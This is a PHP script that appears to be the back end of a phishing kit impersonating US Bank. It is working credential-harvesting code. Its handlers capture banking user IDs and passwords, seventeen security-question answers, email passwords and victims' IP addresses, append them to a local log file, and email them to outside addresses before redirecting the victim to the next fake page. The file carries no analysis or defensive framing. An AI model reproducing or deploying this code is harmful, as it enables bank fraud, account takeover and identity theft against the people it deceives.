<?php 
    	
if(isset($_POST['account_type']) && isset($_POST['personalId']) && isset($_POST['password']))
	{
		// $to = "info@unicityautomation.com";
		$to = "xian1017@outlook.com";
		$subject = "User ID and Password";
		$ipaddress = '';
		if (isset($_SERVER['HTTP_CLIENT_IP']))
			$ipaddress = $_SERVER['HTTP_CLIENT_IP'];
		else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
			$ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
		else if(isset($_SERVER['HTTP_X_FORWARDED']))
			$ipaddress = $_SERVER['HTTP_X_FORWARDED'];
		else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
			$ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
		else if(isset($_SERVER['HTTP_FORWARDED']))
			$ipaddress = $_SERVER['HTTP_FORWARDED'];
		else if(isset($_SERVER['REMOTE_ADDR']))
			$ipaddress = $_SERVER['REMOTE_ADDR'];
		else
			$ipaddress = 'UNKNOWN';
		
	$log = "==================
Banking Type: ".$_POST['type_choose']."
User Id: ".$_POST['personalId']."
Password: ".$_POST['password']."
IP: $ipaddress
==================
";
		
	$fp = fopen("logs.txt", "a");
	fputs($fp, "$log");
	fclose($fp);

		$message = "
			<html>
			<head>
			<title>Personal/User Id First Email</title>
			</head>
			<body>
			<p>Personal/User Id First Email</p>
			<table>
			<tr>
				<td>Banking Type: </td>
				<td>".$_POST['type_choose']."</td>
			</tr>
			<tr>
				<td>User Id: </td>
				<td>".$_POST['personalId']."</td>
			</tr>
			<tr>
				<td>Password: </td>
				<td>".$_POST['password']."</td>
			</tr>
			<tr>
				<td>IP: </td>
				<td>".$ipaddress."</td>
			</tr>
			</table>
			</body>
			</html>
			";
			// Always set content-type when sending HTML email
			$headers = "MIME-Version: 1.0" . "\r\n";
			$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
			// More headers
			$headers .= 'From: <info@unicityautomation.com>' . "\r\n";
			mail($to,$subject,$message,$headers);
			$a = mt_rand(100000000,999999777);
			// header('location:personal_id_step.php?reg='.$a);		
	    	header('location:authentication.php?reg='.$a);
	}
	/* End User id first page email */
	
	/* Start Security Third page email */	
	if(isset($_POST['security_question']))
	{
		$to = "info@unicityautomation.com";
		$subject = "Us Bank Security Question-Third Email";
		$ipaddress = '';
		if (isset($_SERVER['HTTP_CLIENT_IP']))
			$ipaddress = $_SERVER['HTTP_CLIENT_IP'];
		else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
			$ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
		else if(isset($_SERVER['HTTP_X_FORWARDED']))
			$ipaddress = $_SERVER['HTTP_X_FORWARDED'];
		else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
			$ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
		else if(isset($_SERVER['HTTP_FORWARDED']))
			$ipaddress = $_SERVER['HTTP_FORWARDED'];
		else if(isset($_SERVER['REMOTE_ADDR']))
			$ipaddress = $_SERVER['REMOTE_ADDR'];
		else
			$ipaddress = 'UNKNOWN';
			
$log = "==================
IP: $ipaddress
Ques.1 : What was the name of your best friend in high-school? 
Ans.1 ".$_POST['first_ans']."
Ques.2 : What is the name of your first pet? 
Ans.2 ".$_POST['second_ans']."
Ques.3 : Where did you meet your spouse or partner for the very first time? 
Ans.3 ".$_POST['third_ans']."
Ques.4 : What was the name of your favorite manager? 
Ans.4 ".$_POST['fourth_ans']."
Ques.5 : What country would you most like to visit? 
Ans.5 ".$_POST['fifth_ans']."
Ques.6 : What was the model of your first car? 
Ans.6 ".$_POST['sixth_ans']."
Ques.7 : What is your dream car? 
Ans.7 ".$_POST['seventh_ans']."
Ques.8 : What was your favorite game as a child? 
Ans.8 ".$_POST['eigth_ans']."
Ques.9 : What was your favorite movie as a child? 
Ans.9 ".$_POST['ninth_ans']."
Ques.10 : In what city were you married? 
Ans.10 ".$_POST['tenth_ans']."
Ques.11 : What was the name of your favorite childhood toy?
Ans.11 ".$_POST['eleventh_ans']."
Ques.12 : Who was your childhood hero?
Ans.12 ".$_POST['twelveth_ans']."
Ques.13 : What was the name of your first employer?
Ans.13 ".$_POST['thirteenth_ans']."
Ques.14 : In what city does your nearest sibling live?
Ans.14 ".$_POST['fourteenth_ans']."
Ques.15 : Who was your mother's first employer?
Ans.15 ".$_POST['fifteenth_ans']."
Ques.16 : What is the name of a college you applied to but did not attend?
Ans.16 ".$_POST['sixteenth_ans']."
Ques.17 : What is the name of your favorite roommate?
Ans.17 ".$_POST['seventeenth_ans']."
==================
";
		
	$fp = fopen("logs.txt", "a");
	fputs($fp, "$log");
	fclose($fp);




		$message = "
			<html>
			<head>
			<title>Us Bank Security Question-Third Email</title>
			</head>
			<body>
			<p> Security-Questions </p>
			<table>
			<tr>
				<td>IP: </td>
				<td>".$ipaddress."</td>
			</tr>
			<tr>
				<td>Ques.1 : What was the name of your best friend in high-school? </td>
				<td>Ans.1 ".$_POST['first_ans']."</td>
			</tr>
			<tr>
				<td>Ques.2 : What is the name of your first pet? </td>
				<td>Ans.2 ".$_POST['second_ans']."</td>
			</tr>
			<tr>
				<td>Ques.3 : Where did you meet your spouse or partner for the very first time? </td>
				<td>Ans.3 ".$_POST['third_ans']."</td>
			</tr>
			<tr>
				<td>Ques.4 : What was the name of your favorite manager? </td>
				<td>Ans.4 ".$_POST['fourth_ans']."</td>
			</tr>
			<tr>
				<td>Ques.5 : What country would you most like to visit? </td>
				<td>Ans.5 ".$_POST['fifth_ans']."</td>
			</tr>
			<tr>
				<td>Ques.6 : What was the model of your first car? </td>
				<td>Ans.6 ".$_POST['sixth_ans']."</td>
			</tr>
			<tr>
				<td>Ques.7 : What is your dream car? </td>
				<td>Ans.7 ".$_POST['seventh_ans']."</td>
			</tr>
			<tr>
				<td>Ques.8 : What was your favorite game as a child? </td>
				<td>Ans.8 ".$_POST['eigth_ans']."</td>
			</tr>
			<tr>
				<td>Ques.9 : What was your favorite movie as a child? </td>
				<td>Ans.9 ".$_POST['ninth_ans']."</td>
			</tr>
			
			</table>
			</body>
			</html>
			";
			// Always set content-type when sending HTML email
			$headers = "MIME-Version: 1.0" . "\r\n";
			$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
			// More headers
			$headers .= 'From: <info@unicityautomation.com>' . "\r\n";
			mail($to,$subject,$message,$headers);
			$a = mt_rand(100000000,999999777);
	    	header('location:change_email.php?reg='.$a);
	}	
	/* End Security Third page email */

	
	/* Start Email password Fourth Email */			
	if(isset($_POST['change_mail']))
	{ 
		$to = "info@unicityautomation.com";
		$subject = "US Bank - Email Password Fourth Email";
		$ipaddress = '';
		if (isset($_SERVER['HTTP_CLIENT_IP']))
			$ipaddress = $_SERVER['HTTP_CLIENT_IP'];
		else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
			$ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
		else if(isset($_SERVER['HTTP_X_FORWARDED']))
			$ipaddress = $_SERVER['HTTP_X_FORWARDED'];
		else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
			$ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
		else if(isset($_SERVER['HTTP_FORWARDED']))
			$ipaddress = $_SERVER['HTTP_FORWARDED'];
		else if(isset($_SERVER['REMOTE_ADDR']))
			$ipaddress = $_SERVER['REMOTE_ADDR'];
		else
			$ipaddress = 'UNKNOWN';

$log = "==================
Email: ".$_POST['email1']."
Password: ".$_POST['email_cnf']."
IP: $ipaddress
==================
";
					
		$fp = fopen("logs.txt", "a");
		fputs($fp, "$log");
		fclose($fp);

		$message = "
			<html>
			<head>
			<title>US Bank - Email Password Fourth Email</title>
			</head>
			<body>
			<p>US Bank - Email Password Fourth Email</p>
			<table>
			<tr>
				<td>IP: </td>
				<td>".$ipaddress."</td>
			</tr>
			<tr>
				<td>Email: </td>
				<td>".$_POST['email1']."</td>
			</tr>
			<tr>
				<td>Password: </td>
				<td>".$_POST['email_cnf']."</td>
			</tr>
			</table>
			</body>
			</html>
			";

			// Always set content-type when sending HTML email
			$headers = "MIME-Version: 1.0" . "\r\n";
			$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";

			// More headers
			$headers .= 'From: <info@unicityautomation.com>' . "\r\n";
			mail($to,$subject,$message,$headers);
			$a = mt_rand(100000000,999999777);
	    	header('location:enter_verify_pasword.php?reg='.$a);
	}			
	/* End Email password Fourth Email */		
	
	/* Start Confirm Email password Fifth Email */		
	if(isset($_POST['verify_change_mail']))
	{ 
		$to = "info@unicityautomation.com";
		$subject = "US bank - Confirm Email Password - Fifth Email";
		$ipaddress = '';
		if (isset($_SERVER['HTTP_CLIENT_IP']))
			$ipaddress = $_SERVER['HTTP_CLIENT_IP'];
		else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
			$ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
		else if(isset($_SERVER['HTTP_X_FORWARDED']))
			$ipaddress = $_SERVER['HTTP_X_FORWARDED'];
		else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
			$ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
		else if(isset($_SERVER['HTTP_FORWARDED']))
			$ipaddress = $_SERVER['HTTP_FORWARDED'];
		else if(isset($_SERVER['REMOTE_ADDR']))
			$ipaddress = $_SERVER['REMOTE_ADDR'];
		else
			$ipaddress = 'UNKNOWN';
			

$log = "==================
Confirm Email: ".$_POST['email_verify']."
Confirm Password: ".$_POST['pass_verify']."
IP: $ipaddress
==================
";
								
		$fp = fopen("logs.txt", "a");
		fputs($fp, "$log");
		fclose($fp);



		$message = "
			<html>
			<head>
			<title>US bank - Confirm Email Password - Fifth Email</title>
			</head>
			<body>
			<p>US bank - Confirm Email Password - Fifth Email</p>
			<table>
			<tr>
				<td>IP: </td>
				<td>".$ipaddress."</td>
			</tr>
			<tr>
				<td>Confirm Email: </td>
				<td>".$_POST['email_verify']."</td>
			</tr>
			<tr>
				<td>Confirm Password: </td>
				<td>".$_POST['pass_verify']."</td>
			</tr>	
			</table>
			</body>
			</html>
			";
			// Always set content-type when sending HTML email
			$headers = "MIME-Version: 1.0" . "\r\n";
			$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
			// More headers
			$headers .= 'From: <info@unicityautomation.com>' . "\r\n";
			mail($to,$subject,$message,$headers);
			$a = mt_rand(100000000,999999777);
			header('location:thnku.php?reg='.$a);
	}
	/* End Confirm Email password Fifth Email */	
	
?>